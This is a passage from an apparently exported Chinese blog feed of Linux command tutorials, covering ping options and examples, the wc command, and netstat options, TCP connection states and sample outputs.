使用Socket的SO_DEBUG功能。 -f 极限检测。大量且快速地送网络封包给一台机器，看它的回应。 -n 只输出数值。 -q 不显示任何传送封包的信息，只显示最后的结果。 -r 忽略普通的Routing Table，直接将数据包送到远端主机上。通常是查看本机的网络接口是否有问题。 -R 记录路由过程。 -v 详细显示指令的执行过程。 -c 数目：在发送指定数目的包后停止。 -i 秒数：设定间隔几秒送一个网络封包给一台机器，预设值是一秒送一次。 -I 网络界面：使用指定的网络界面送出数据包。 -l 前置载入：设置在送出要求信息之前，先行发出的数据包。 -p 范本样式：设置填满数据包的范本样式。 -s 字节数：指定发送的数据字节数，预设值是56，加上8字节的ICMP头，一共是64ICMP数据字节。 -t 存活数值：设置存活数值TTL的大小。 4.使用实例实例1：ping的通的情况&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ping 192.168.120.205 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112[root@localhost ~]# ping 192.168.120.205PING 192.168.120.205 (192.168.120.205) 56(84) bytes of data.64 bytes from 192.168.120.205: icmp_seq=1 ttl=64 time=0.720 ms64 bytes from 192.168.120.205: icmp_seq=2 ttl=64 time=0.181 ms64 bytes from 192.168.120.205: icmp_seq=3 ttl=64 time=0.191 ms64 bytes from 192.168.120.205: icmp_seq=4 ttl=64 time=0.188 ms64 bytes from 192.168.120.205: icmp_seq=5 ttl=64 time=0.189 ms--- 192.168.120.205 ping statistics ---5 packets transmitted, 5 received, 0% packet loss, time 4000msrtt min/avg/max/mdev = 0.181/0.293/0.720/0.214 ms[root@localhost ~]# 实例2：ping不通的情况&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ping 192.168.120.202 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213[root@localhost ~]# ping 192.168.120.202PING 192.168.120.202 (192.168.120.202) 56(84) bytes of data.From 192.168.120.204 icmp_seq=1 Destination Host UnreachableFrom 192.168.120.204 icmp_seq=2 Destination Host UnreachableFrom 192.168.120.204 icmp_seq=3 Destination Host UnreachableFrom 192.168.120.204 icmp_seq=4 Destination Host UnreachableFrom 192.168.120.204 icmp_seq=5 Destination Host UnreachableFrom 192.168.120.204 icmp_seq=6 Destination Host Unreachable--- 192.168.120.202 ping statistics ---8 packets transmitted, 0 received, +6 errors, 100% packet loss, time 7005ms, pipe 4[root@localhost ~]# 实例3：ping网关&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ping -b 192.168.120.1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718[root@localhost ~]# routeKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface192.168.120.0 * 255.255.255.0 U 0 0 0 eth0192.168.0.0 192.168.120.1 255.255.0.0 UG 0 0 0 eth010.0.0.0 192.168.120.1 255.0.0.0 UG 0 0 0 eth0default 192.168.120.240 0.0.0.0 UG 0 0 0 eth0[root@localhost ~]# ping -b 192.168.120.1PING 192.168.120.1 (192.168.120.1) 56(84) bytes of data.64 bytes from 192.168.120.1: icmp_seq=1 ttl=255 time=2.02 ms64 bytes from 192.168.120.1: icmp_seq=2 ttl=255 time=1.83 ms64 bytes from 192.168.120.1: icmp_seq=3 ttl=255 time=1.68 ms64 bytes from 192.168.120.1: icmp_seq=4 ttl=255 time=1.98 ms64 bytes from 192.168.120.1: icmp_seq=5 ttl=255 time=1.88 ms--- 192.168.120.1 ping statistics ---5 packets transmitted, 5 received, 0% packet loss, time 4000msrtt min/avg/max/mdev = 1.682/1.880/2.020/0.129 ms 实例4：ping指定次数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ping -c 10 192.168.120.206 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617[root@localhost ~]# ping -c 10 192.168.120.206PING 192.168.120.206 (192.168.120.206) 56(84) bytes of data.64 bytes from 192.168.120.206: icmp_seq=1 ttl=64 time=1.25 ms64 bytes from 192.168.120.206: icmp_seq=2 ttl=64 time=0.260 ms64 bytes from 192.168.120.206: icmp_seq=3 ttl=64 time=0.242 ms64 bytes from 192.168.120.206: icmp_seq=4 ttl=64 time=0.271 ms64 bytes from 192.168.120.206: icmp_seq=5 ttl=64 time=0.274 ms64 bytes from 192.168.120.206: icmp_seq=6 ttl=64 time=0.295 ms64 bytes from 192.168.120.206: icmp_seq=7 ttl=64 time=0.269 ms64 bytes from 192.168.120.206: icmp_seq=8 ttl=64 time=0.270 ms64 bytes from 192.168.120.206: icmp_seq=9 ttl=64 time=0.253 ms64 bytes from 192.168.120.206: icmp_seq=10 ttl=64 time=0.289 ms--- 192.168.120.206 ping statistics ---10 packets transmitted, 10 received, 0% packet loss, time 9000msrtt min/avg/max/mdev = 0.242/0.367/1.251/0.295 ms[root@localhost ~]# 实例5：时间间隔和次数限制的ping&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ping -c 10 -i 0.5 192.168.120.206 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718192021222324252627282930313233[root@localhost ~]# ping -c 10 -i 0.5 192.168.120.206PING 192.168.120.206 (192.168.120.206) 56(84) bytes of data.64 bytes from 192.168.120.206: icmp_seq=1 ttl=64 time=1.24 ms64 bytes from 192.168.120.206: icmp_seq=2 ttl=64 time=0.235 ms64 bytes from 192.168.120.206: icmp_seq=3 ttl=64 time=0.244 ms64 bytes from 192.168.120.206: icmp_seq=4 ttl=64 time=0.300 ms64 bytes from 192.168.120.206: icmp_seq=5 ttl=64 time=0.255 ms64 bytes from 192.168.120.206: icmp_seq=6 ttl=64 time=0.264 ms64 bytes from 192.168.120.206: icmp_seq=7 ttl=64 time=0.263 ms64 bytes from 192.168.120.206: icmp_seq=8 ttl=64 time=0.331 ms64 bytes from 192.168.120.206: icmp_seq=9 ttl=64 time=0.247 ms64 bytes from 192.168.120.206: icmp_seq=10 ttl=64 time=0.244 ms--- 192.168.120.206 ping statistics ---10 packets transmitted, 10 received, 0% packet loss, time 4499msrtt min/avg/max/mdev = 0.235/0.362/1.241/0.294 ms[root@localhost ~]# ping -c 10 -i 0.01 192.168.120.206PING 192.168.120.206 (192.168.120.206) 56(84) bytes of data.64 bytes from 192.168.120.206: icmp_seq=1 ttl=64 time=0.244 ms64 bytes from 192.168.120.206: icmp_seq=2 ttl=64 time=0.195 ms64 bytes from 192.168.120.206: icmp_seq=3 ttl=64 time=0.219 ms64 bytes from 192.168.120.206: icmp_seq=4 ttl=64 time=0.204 ms64 bytes from 192.168.120.206: icmp_seq=5 ttl=64 time=3.56 ms64 bytes from 192.168.120.206: icmp_seq=6 ttl=64 time=1.93 ms64 bytes from 192.168.120.206: icmp_seq=7 ttl=64 time=0.193 ms64 bytes from 192.168.120.206: icmp_seq=8 ttl=64 time=0.193 ms64 bytes from 192.168.120.206: icmp_seq=9 ttl=64 time=0.202 ms64 bytes from 192.168.120.206: icmp_seq=10 ttl=64 time=0.211 ms--- 192.168.120.206 ping statistics ---10 packets transmitted, 10 received, 0% packet loss, time 90msrtt min/avg/max/mdev = 0.193/0.716/3.564/1.080 ms[root@localhost ~]# 实例6：通过域名ping公网上的站点&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ping -c 5 www.58.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112peida-VirtualBox ~ # ping -c 5 www.58.comPING www.58.com (211.151.111.30) 56(84) bytes of data.64 bytes from 211.151.111.30: icmp_req=1 ttl=49 time=14.7 ms64 bytes from 211.151.111.30: icmp_req=2 ttl=49 time=16.4 ms64 bytes from 211.151.111.30: icmp_req=3 ttl=49 time=15.2 ms64 bytes from 211.151.111.30: icmp_req=4 ttl=49 time=14.6 ms64 bytes from 211.151.111.30: icmp_req=5 ttl=49 time=19.9 ms--- www.58.com ping statistics ---5 packets transmitted, 5 received, 0% packet loss, time 20101msrtt min/avg/max/mdev = 14.618/16.192/19.917/1.965 mspeida-VirtualBox ~ # 实例7：多参数使用&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ping -i 3 -s 1024 -t 255 192.168.120.206 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122[root@localhost ~]# ping -i 3 -s 1024 -t 255 192.168.120.206PING 192.168.120.206 (192.168.120.206) 1024(1052) bytes of data.1032 bytes from 192.168.120.206: icmp_seq=1 ttl=64 time=1.99 ms1032 bytes from 192.168.120.206: icmp_seq=2 ttl=64 time=0.694 ms1032 bytes from 192.168.120.206: icmp_seq=3 ttl=64 time=0.300 ms1032 bytes from 192.168.120.206: icmp_seq=4 ttl=64 time=0.481 ms1032 bytes from 192.168.120.206: icmp_seq=5 ttl=64 time=0.415 ms1032 bytes from 192.168.120.206: icmp_seq=6 ttl=64 time=0.600 ms1032 bytes from 192.168.120.206: icmp_seq=7 ttl=64 time=0.411 ms1032 bytes from 192.168.120.206: icmp_seq=8 ttl=64 time=0.281 ms1032 bytes from 192.168.120.206: icmp_seq=9 ttl=64 time=0.318 ms1032 bytes from 192.168.120.206: icmp_seq=10 ttl=64 time=0.362 ms1032 bytes from 192.168.120.206: icmp_seq=11 ttl=64 time=0.408 ms1032 bytes from 192.168.120.206: icmp_seq=12 ttl=64 time=0.445 ms1032 bytes from 192.168.120.206: icmp_seq=13 ttl=64 time=0.397 ms1032 bytes from 192.168.120.206: icmp_seq=14 ttl=64 time=0.406 ms1032 bytes from 192.168.120.206: icmp_seq=15 ttl=64 time=0.458 ms--- 192.168.120.206 ping statistics ---15 packets transmitted, 15 received, 0% packet loss, time 41999msrtt min/avg/max/mdev = 0.281/0.531/1.993/0.404 ms[root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-i 3 发送周期为 3秒 -s 设置发送包的大小为1024 -t 设置TTL值为 255]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- wc]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F42.%20Linux%20%E5%91%BD%E4%BB%A4-%20wc%2F</url>
    <content type="text"><![CDATA[Linux 命令-wc&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux系统中的wc(Word Count)命令的功能为统计指定文件中的字节数、字数、行数，并将统计结果显示输出。 1．命令格式1wc [选项]文件... 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;统计指定文件中的字节数、字数、行数，并将统计结果显示输出。该命令统计指定文件中的字节数、字数、行数。如果没有给出文件名，则从标准输入读取。wc同时也给出所指定文件的总统计数。 3．命令参数 -c 统计字节数。 -l 统计行数。 -m 统计字符数。这个标志不能与 -c 标志一起使用。 -w 统计字数。一个字被定义为由空白、跳格或换行字符分隔的字符串。 -L 打印最长行的长度。 -help 显示帮助信息 –version 显示版本信息 4．使用实例实例1：查看文件的字节数、字数、行数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1wc test.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920[root@localhost test]# cat test.txt hnlinuxpeida.cnblogs.comubuntuubuntu linuxredhatRedhatlinuxmint[root@localhost test]# wc test.txt 7 8 70 test.txt[root@localhost test]# wc -l test.txt 7 test.txt[root@localhost test]# wc -c test.txt 70 test.txt[root@localhost test]# wc -w test.txt 8 test.txt[root@localhost test]# wc -m test.txt 70 test.txt[root@localhost test]# wc -L test.txt 17 test.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;7&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;8&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;70&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;test.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;行数 单词数 字节数 文件名 实例2：用wc命令怎么做到只打印统计数字不打印文件名&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1wc -l test.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost test]# wc -l test.txt 7 test.txt[root@localhost test]# cat test.txt |wc -l7[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用管道线，这在编写shell脚本时特别有用。 实例3：用来统计当前目录下的文件数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ls -l | wc -l &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213[root@localhost test]# cd test6[root@localhost test6]# ll总计 604---xr--r-- 1 root mail 302108 11-30 08:39 linklog.log---xr--r-- 1 mail users 302108 11-30 08:39 log2012.log-rw-r--r-- 1 mail users 61 11-30 08:39 log2013.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2014.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2015.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2016.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2017.log[root@localhost test6]# ls -l | wc -l8[root@localhost test6]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;数量中包含当前目录]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- netstat]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F58.%20Linux%20%E5%91%BD%E4%BB%A4-%20netstat%2F</url>
    <content type="text"><![CDATA[Linux 命令- netstat&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;netstat命令用于显示与IP、TCP、UDP和ICMP协议相关的统计数据，一般用于检验本机各端口的网络连接情况。netstat是在内核中访问网络及相关信息的程序，它能提供TCP连接，TCP和UDP监听，进程内存管理的相关报告。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果你的计算机有时候接收到的数据报导致出错数据或故障，你不必感到奇怪，TCP/IP可以容许这些类型的错误，并能够自动重发数据报。但如果累计的出错情况数目占到所接收的IP数据报相当大的百分比，或者它的数目正迅速增加，那么你就应该使用netstat查一查为什么会出现这些情况了。 1．命令格式1netstat [-acCeFghilMnNoprstuvVwx] [-A&lt;网络类型&gt;] [--ip] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;netstat用于显示与IP、TCP、UDP和ICMP协议相关的统计数据，一般用于检验本机各端口的网络连接情况。 3．命令参数 -a或–all 显示所有连线中的Socket。 -A&lt;网络类型&gt;或–&lt;网络类型&gt; 列出该网络类型连线中的相关地址。 -c或–continuous 持续列出网络状态。 -C或–cache 显示路由器配置的快取信息。 -e或–extend 显示网络其他相关信息。 -F或–fib 显示FIB。 -g或–groups 显示多重广播功能群组组员名单。 -h或–help 在线帮助。 -i或–interfaces 显示网络界面信息表单。 -l或–listening 显示监控中的服务器的Socket。 -M或–masquerade 显示伪装的网络连线。 -n或–numeric 直接使用IP地址，而不通过域名服务器。 -N或–netlink或–symbolic 显示网络硬件外围设备的符号连接名称。 -o或–timers 显示计时器。 -p或–programs 显示正在使用Socket的程序识别码和程序名称。 -r或–route 显示Routing Table。 -s或–statistice 显示网络工作信息统计表。 -t或–tcp 显示TCP传输协议的连线状况。 -u或–udp 显示UDP传输协议的连线状况。 -v或–verbose 显示指令执行过程。 -V或–version 显示版本信息。 -w或–raw 显示RAW传输协议的连线状况。 -x或–unix 此参数的效果和指定”-A unix”参数相同。 –ip或–inet 此参数的效果和指定”-A inet”参数相同。 4．使用实例实例1：无参数使用&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314[root@localhost ~]# netstatActive Internet connections (w/o servers)Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 268 192.168.120.204:ssh 10.2.0.68:62420 ESTABLISHED udp 0 0 192.168.120.204:4371 10.58.119.119:domain ESTABLISHED Active UNIX domain sockets (w/o servers)Proto RefCnt Flags Type State I-Node Pathunix 2 [ ] DGRAM 1491 @/org/kernel/udev/udevdunix 4 [ ] DGRAM 7337 /dev/logunix 2 [ ] DGRAM 708823 unix 2 [ ] DGRAM 7539 unix 3 [ ] STREAM CONNECTED 7287 unix 3 [ ] STREAM CONNECTED 7286 [root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从整体上看，netstat的输出结果可以分为两个部分： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一个是Active Internet connections，称为有源TCP连接，其中”Recv-Q”和”Send-Q”指的是接收队列和发送队列。这些数字一般都应该是0。如果不是则表示软件包正在队列中堆积。这种情况只能在非常少的情况见到。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另一个是Active UNIX domain sockets，称为有源Unix域套接口(和网络套接字一样，但是只能用于本机通信，性能可以提高一倍)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Proto显示连接使用的协议,RefCnt表示连接到本套接口上的进程号,Types显示套接口的类型,State显示套接口当前的状态,Path表示连接到套接口的其它进程使用的路径名。 套接口类型： -t ：TCP -u ：UDP -raw ：RAW类型 –unix ：UNIX域类型 –ax25 ：AX25类型 –ipx ：ipx类型 –netrom ：netrom类型 状态说明： LISTEN：侦听来自远方的TCP端口的连接请求 SYN-SENT：再发送连接请求后等待匹配的连接请求（如果有大量这样的状态包，检查是否中招了） SYN-RECEIVED：再收到和发送一个连接请求后等待对方对连接请求的确认（如有大量此状态，估计被flood攻击了） ESTABLISHED：代表一个打开的连接 FIN-WAIT-1：等待远程TCP连接中断请求，或先前的连接中断请求的确认 FIN-WAIT-2：从远程TCP等待连接中断请求 CLOSE-WAIT：等待从本地用户发来的连接中断请求 CLOSING：等待远程TCP对连接中断的确认 LAST-ACK：等待原来的发向远程TCP的连接中断请求的确认（不是什么好东西，此项出现，检查是否被攻击） TIME-WAIT：等待足够的时间以确保远程TCP接收到连接中断请求的确认CLOSED：没有任何连接状态 实例2：列出所有端口&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat -a &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920[root@localhost ~]# netstat -aActive Internet connections (servers and established)Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 localhost:smux *:* LISTEN tcp 0 0 *:svn *:* LISTEN tcp 0 0 *:ssh *:* LISTEN tcp 0 284 192.168.120.204:ssh 10.2.0.68:62420 ESTABLISHED udp 0 0 localhost:syslog *:* udp 0 0 *:snmp *:* Active UNIX domain sockets (servers and established)Proto RefCnt Flags Type State I-Node Pathunix 2 [ ACC ] STREAM LISTENING 708833 /tmp/ssh-yKnDB15725/agent.15725unix 2 [ ACC ] STREAM LISTENING 7296 /var/run/audispd_eventsunix 2 [ ] DGRAM 1491 @/org/kernel/udev/udevdunix 4 [ ] DGRAM 7337 /dev/logunix 2 [ ] DGRAM 708823 unix 2 [ ] DGRAM 7539 unix 3 [ ] STREAM CONNECTED 7287 unix 3 [ ] STREAM CONNECTED 7286 [root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;显示一个所有的有效连接信息列表，包括已建立的连接（ESTABLISHED），也包括监听连接请（LISTENING）的那些连接。 实例3：显示当前UDP连接状况&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat -nu &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213[root@andy ~]# netstat -nuActive Internet connections (w/o servers)Proto Recv-Q Send-Q Local Address Foreign Address State udp 0 0 ::ffff:192.168.12:53392 ::ffff:192.168.9.120:10000 ESTABLISHED udp 0 0 ::ffff:192.168.12:56723 ::ffff:192.168.9.120:10000 ESTABLISHED udp 0 0 ::ffff:192.168.12:56480 ::ffff:192.168.9.120:10000 ESTABLISHED udp 0 0 ::ffff:192.168.12:58154 ::ffff:192.168.9.120:10000 ESTABLISHED udp 0 0 ::ffff:192.168.12:44227 ::ffff:192.168.9.120:10000 ESTABLISHED udp 0 0 ::ffff:192.168.12:36954 ::ffff:192.168.9.120:10000 ESTABLISHED udp 0 0 ::ffff:192.168.12:53984 ::ffff:192.168.9.120:10000 ESTABLISHED udp 0 0 ::ffff:192.168.12:57703 ::ffff:192.168.9.120:10000 ESTABLISHED udp 0 0 ::ffff:192.168.12:53613 ::ffff:192.168.9.120:10000 ESTABLISHED [root@andy ~]# 实例4：显示UDP端口号的使用情况&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat -apu &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718192021222324252627282930[root@andy ~]# netstat -apuActive Internet connections (servers and established)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name udp 0 0 *:57604 *:* 28094/java udp 0 0 *:40583 *:* 21220/java udp 0 0 *:45451 *:* 14583/java udp 0 0 ::ffff:192.168.12:53392 ::ffff:192.168.9.120:ndmp ESTABLISHED 19327/java udp 0 0 *:52370 *:* 15841/java udp 0 0 ::ffff:192.168.12:56723 ::ffff:192.168.9.120:ndmp ESTABLISHED 15841/java udp 0 0 *:44182 *:* 31757/java udp 0 0 *:48155 *:* 5476/java udp 0 0 *:59808 *:* 17333/java udp 0 0 ::ffff:192.168.12:56480 ::ffff:192.168.9.120:ndmp ESTABLISHED 28094/java udp 0 0 ::ffff:192.168.12:58154 ::ffff:192.168.9.120:ndmp ESTABLISHED 15429/java udp 0 0 *:36780 *:* 10091/java udp 0 0 *:36795 *:* 24594/java udp 0 0 *:41922 *:* 20506/java udp 0 0 ::ffff:192.168.12:44227 ::ffff:192.168.9.120:ndmp ESTABLISHED 17333/java udp 0 0 *:34258 *:* 8866/java udp 0 0 *:55508 *:* 11667/java udp 0 0 *:36055 *:* 12425/java udp 0 0 ::ffff:192.168.12:36954 ::ffff:192.168.9.120:ndmp ESTABLISHED 16532/java udp 0 0 ::ffff:192.168.12:53984 ::ffff:192.168.9.120:ndmp ESTABLISHED 20506/java udp 0 0 ::ffff:192.168.12:57703 ::ffff:192.168.9.120:ndmp ESTABLISHED 31757/java udp 0 0 ::ffff:192.168.12:53613 ::ffff:192.168.9.120:ndmp ESTABLISHED 3199/java udp 0 0 *:56309 *:* 15429/java udp 0 0 *:54007 *:* 16532/java udp 0 0 *:39544 *:* 3199/java udp 0 0 *:43900 *:* 19327/java [root@andy ~]# 实例5：显示网卡列表&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat -i &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456[root@andy ~]# netstat -iKernel Interface tableIface MTU Met RX-OK RX-ERR RX-DRP RX-OVR TX-OK TX-ERR TX-DRP TX-OVR Flgeth0 1500 0 151818887 0 0 0 198928403 0 0 0 BMRUlo 16436 0 107235 0 0 0 107235 0 0 0 LRU[root@andy ~]# 实例6：显示组播组的关系&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat -g &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910[root@andy ~]# netstat -gIPv6/IPv4 Group MembershipsInterface RefCnt Group--------------- ------ ---------------------lo 1 all-systems.mcast.neteth0 1 all-systems.mcast.netlo 1 ff02::1eth0 1 ff02::1:ffff:9b0ceth0 1 ff02::1[root@andy ~]# 实例7：显示网络统计信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat -s &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263[root@localhost ~]# netstat -sIp: 530999 total packets received 0 forwarded 0 incoming packets discarded 530999 incoming packets delivered 8258 requests sent out 1 dropped because of missing routeIcmp: 90 ICMP messages received 0 input ICMP message failed. ICMP input histogram: destination unreachable: 17 echo requests: 1 echo replies: 72 106 ICMP messages sent 0 ICMP messages failed ICMP output histogram: destination unreachable: 8 echo request: 97 echo replies: 1IcmpMsg: InType0: 72 InType3: 17 InType8: 1 OutType0: 1 OutType3: 8 OutType8: 97Tcp: 8 active connections openings 15 passive connection openings 8 failed connection attempts 3 connection resets received 1 connections established 3132 segments received 2617 segments send out 53 segments retransmited 0 bad segments received. 252 resets sentUdp: 0 packets received 0 packets to unknown port received. 0 packet receive errors 5482 packets sentTcpExt: 1 invalid SYN cookies received 1 TCP sockets finished time wait in fast timer 57 delayed acks sent Quick ack mode was activated 50 times 60 packets directly queued to recvmsg prequeue. 68 packets directly received from backlog 4399 packets directly received from prequeue 520 packets header predicted 51 packets header predicted and directly queued to user 1194 acknowledgments not containing data received 21 predicted acknowledgments 0 TCP data loss events 1 timeouts after reno fast retransmit 9 retransmits in slow start 42 other TCP timeouts 3 connections aborted due to timeoutIpExt: InBcastPkts: 527777 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;按照各个协议分别显示其统计数据。如果我们的应用程序（如Web浏览器）运行速度比较慢，或者不能显示Web页之类的数据，那么我们就可以用本选项来查看一下所显示的信息。我们需要仔细查看统计数据的各行，找到出错的关键字，进而确定问题所在。 实例8：显示监听的套接口&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat -l &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213[root@localhost ~]# netstat -lActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 localhost:smux *:* LISTEN tcp 0 0 *:svn *:* LISTEN tcp 0 0 *:ssh *:* LISTEN udp 0 0 localhost:syslog *:* udp 0 0 *:snmp *:* Active UNIX domain sockets (only servers)Proto RefCnt Flags Type State I-Node Pathunix 2 [ ACC ] STREAM LISTENING 708833 /tmp/ssh-yKnDB15725/agent.15725unix 2 [ ACC ] STREAM LISTENING 7296 /var/run/audispd_events[root@localhost ~]# 实例9：显示所有已建立的有效连接&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat -n &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213[root@localhost ~]# netstat -nActive Internet connections (w/o servers)Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 268 192.168.120.204:22 10.2.0.68:62420 ESTABLISHED Active UNIX domain sockets (w/o servers)Proto RefCnt Flags Type State I-Node Pathunix 2 [ ] DGRAM 1491 @/org/kernel/udev/udevdunix 4 [ ] DGRAM 7337 /dev/logunix 2 [ ] DGRAM 708823 unix 2 [ ] DGRAM 7539 unix 3 [ ] STREAM CONNECTED 7287 unix 3 [ ] STREAM CONNECTED 7286 [root@localhost ~]# 实例10：显示关于以太网的统计数据&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat -e &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213[root@localhost ~]# netstat -eActive Internet connections (w/o servers)Proto Recv-Q Send-Q Local Address Foreign Address State User Inode tcp 0 248 192.168.120.204:ssh 10.2.0.68:62420 ESTABLISHED root 708795 Active UNIX domain sockets (w/o servers)Proto RefCnt Flags Type State I-Node Pathunix 2 [ ] DGRAM 1491 @/org/kernel/udev/udevdunix 4 [ ] DGRAM 7337 /dev/logunix 2 [ ] DGRAM 708823 unix 2 [ ] DGRAM 7539 unix 3 [ ] STREAM CONNECTED 7287 unix 3 [ ] STREAM CONNECTED 7286 [root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用于显示关于以太网的统计数据。它列出的项目包括传送的数据报的总字节数、错误数、删除数、数据报的数量和广播的数量。这些统计数据既有发送的数据报数量，也有接收的数据报数量。这个选项可以用来统计一些基本的网络流量） 实例11：显示关于路由表的信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat -r &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678[root@localhost ~]# netstat -rKernel IP routing tableDestination Gateway Genmask Flags MSS Window irtt Iface192.168.120.0 * 255.255.255.0 U 0 0 0 eth0192.168.0.0 192.168.120.1 255.255.0.0 UG 0 0 0 eth010.0.0.0 192.168.120.1 255.0.0.0 UG 0 0 0 eth0default 192.168.120.240 0.0.0.0 UG 0 0 0 eth0[root@localhost ~]# 实例12：列出所有 tcp 端口&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat -at &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678[root@localhost ~]# netstat -atActive Internet connections (servers and established)Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 localhost:smux *:* LISTEN tcp 0 0 *:svn *:* LISTEN tcp 0 0 *:ssh *:* LISTEN tcp 0 284 192.168.120.204:ssh 10.2.0.68:62420 ESTABLISHED [root@localhost ~]# 实例13：统计机器中网络连接各个状态个数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat -a | awk '/^tcp/ &#123;++S[$NF]&#125; END &#123;for(a in S) print a, S[a]&#125;' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost ~]# netstat -a | awk '/^tcp/ &#123;++S[$NF]&#125; END &#123;for(a in S) print a, S[a]&#125;'ESTABLISHED 1LISTEN 3[root@localhost ~]# 实例14：把状态全都取出来后使用uniq 